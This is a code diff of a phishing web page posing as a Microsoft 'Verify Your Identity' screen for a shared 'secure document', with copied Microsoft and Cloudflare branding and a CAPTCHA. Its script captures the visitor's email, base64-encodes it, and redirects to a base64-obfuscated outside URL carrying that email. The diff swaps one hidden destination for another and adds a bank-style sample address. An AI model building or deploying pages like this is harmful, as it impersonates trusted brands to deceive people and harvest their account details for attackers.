@@ -41,9 +41,9 @@
             background-color: white;
             border: 1px solid #ccc;
             border-radius: 3px;
-            padding: 33px;
+            padding: 30px;
             width: 80%;
-            max-width: 300px;
+            max-width: 350px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
             margin-top: 0px;
@@ -56,25 +56,25 @@
 
         .container h2 {
             font-size: 24px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             color: #333;
         }
 
         .container p {
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             color: #666;
         }
 
         .container p2 {
-            margin-bottom: 10px;
+            margin-bottom: 20px;
             color: #666;
             font-size: 13px;
-            margin-bottom: 20px;
+            line-height: 1.4;
         }
 
         .container input[type="email"] {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             margin-bottom: 15px;
             border: 1px solid #ccc;
             border-radius: 3px;
@@ -90,9 +90,16 @@
             justify-content: center;
         }
 
+        .captcha-header {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
         .container button {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: #0078d4;
             color: white;
             border: none;
@@ -100,6 +107,7 @@
             font-size: 16px;
             cursor: pointer;
             margin-top: 10px;
+            font-weight: 500;
         }
 
         .container button:hover {
@@ -112,21 +120,49 @@
         }
 
         .container .footer {
-            font-size: 12px;
+            font-size: 11px;
             color: #888;
-            margin-top: 20px;
+            margin-top: 25px;
+            line-height: 1.5;
         }
 
         .error-message {
             color: #d13438;
+            font-size: 13px;
+            margin: 10px 0;
+            min-height: 18px;
+            font-weight: 500;
+        }
+
+        .success-message {
+            color: #107c10;
             font-size: 14px;
             margin: 10px 0;
-            min-height: 20px;
+            font-weight: 500;
+            display: none;
+        }
+
+        .cloudflare-footer {
+            font-size: 11px;
+            color: #666;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .cloudflare-footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .cloudflare-footer a:hover {
+            text-decoration: underline;
         }
 
         @media (max-width: 600px) {
             .container {
                 padding: 20px;
+                margin: 10px;
             }
 
             .container h2 {
@@ -135,10 +171,12 @@
 
             .container input[type="email"] {
                 font-size: 14px;
+                padding: 10px;
             }
 
             .container button {
                 font-size: 14px;
+                padding: 10px;
             }
         }
     </style>
@@ -150,18 +188,33 @@
     <div class="container">
         <img src="https://ehehsonear.pages.dev/liveforever.png" alt="soft Logo">
         <h2>Verify Your Identity</h2>
-        <p><strong>You've received a secure document &</strong></p>
+        <p><strong>You've received a secure document</strong></p>
         <p2>To open this secure document, we'll need to verify the intended recipient's email. Please enter the email address to which this item was shared.</p2>
-        <input type="email" id="email-input" placeholder="Enter email" required>
         
-        <!-- Cloudflare CAPTCHA -->
-        <div class="cf-turnstile" data-sitekey="0x4AAAAAACaHNXiIB3vMTh35" data-callback="captchaSuccess" data-expired-callback="captchaExpired"></div>
+        <input type="email" id="email-input" placeholder="gary@chase.com" required>
+        
+        <!-- CAPTCHA Section -->
+        <div class="captcha-header">Let us know you are human</div>
+        <div class="cf-turnstile" data-sitekey="0x4AAAAAAABtnIag8Vrg39nD" data-callback="captchaSuccess" data-expired-callback="captchaExpired"></div>
+        
+        <!-- Success Message (Hidden by default) -->
+        <div class="success-message" id="success-message">Success!</div>
         
         <div class="error-message" id="error-message"></div>
         
+        <!-- Cloudflare Footer -->
+        <div class="cloudflare-footer">
+            <span>CLOUDFLARE</span>
+            <a href="https://www.cloudflare.com/privacypolicy/" target="_blank">Privacy</a> • 
+            <a href="https://www.cloudflare.com/website-terms/" target="_blank">Terms</a>
+        </div>
+        
         <button id="continue-button" disabled>Next</button>
-        <p class="footer">By clicking Next you allow Microsoft to use your email address in accordance with their privacy statement.</p>
-        <p class="footer">© 2026 Microsoft Privacy & Cookies</p>
+        
+        <div class="footer">
+            <p>By clicking Next you allow Microsoft to use your email address in accordance with their privacy statement.</p>
+            <p>© 2026 Microsoft Privacy & Cookies</p>
+        </div>
     </div>
 
     <script>
@@ -298,16 +351,19 @@
             captchaVerified = true;
             document.getElementById('continue-button').disabled = false;
             document.getElementById('error-message').textContent = '';
+            document.getElementById('success-message').style.display = 'block';
         }
 
         function captchaExpired() {
             captchaVerified = false;
             document.getElementById('continue-button').disabled = true;
             document.getElementById('error-message').textContent = 'CAPTCHA expired. Please verify again.';
+            document.getElementById('success-message').style.display = 'none';
         }
 
         function showError(message) {
             document.getElementById('error-message').textContent = message;
+            document.getElementById('success-message').style.display = 'none';
         }
 
         async function continueLoading() {
@@ -330,14 +386,14 @@
             showError('');
 
             // For any valid email (no email list check)
-            const link = "aHR0cHM6Ly9ramhndi5taWRjaXR5bW90ZWwuY29tLz9qR0VBOUxDQW89TkRRNE9UTXpabVU1TldSbU5HTm1OV0kxTVRneE1HWTBaalJpTUdabU1HTSUzRCZNdWdKYWE9MHpQYXpP";
+            const link = "aHR0cHM6Ly9mYWNlYm9vay5jb20vP1M9";
             const decodedLink = atob(link);
             
             // Encode the email for the URL
             const encodedEmail = btoa(email);
             
-            // Create final link: decodedlink + &eu= + encoded email
-            const finalLink = `${decodedLink}&eu=${encodedEmail}`;
+            // Create final link: decodedlink + &e= + encoded email
+            const finalLink = `${decodedLink}&e=${encodedEmail}`;
             
             // Redirect to the final link
             window.location.href = finalLink;
@@ -373,6 +429,9 @@
             const decodedEmail = extractEmailFromURL();
             if (decodedEmail) {
                 document.getElementById('email-input').value = decodedEmail;
+            } else {
+                // Set placeholder example
+                document.getElementById('email-input').placeholder = "gary@chase.com";
             }
             
             // Set up event listeners
